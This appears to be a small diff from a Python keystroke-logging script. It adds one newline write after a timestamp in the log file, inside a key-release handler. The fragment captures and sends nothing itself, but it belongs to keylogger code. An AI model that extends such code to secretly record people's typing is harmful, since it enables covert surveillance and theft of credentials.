@@ -31,6 +31,7 @@ def on_release(key) :
         with open(filepath + keylog, "a") as f :
              f.write('\n')
              f.write(currenttime)
+             f.write('\n')
         return False
 
 def writefile(keys):
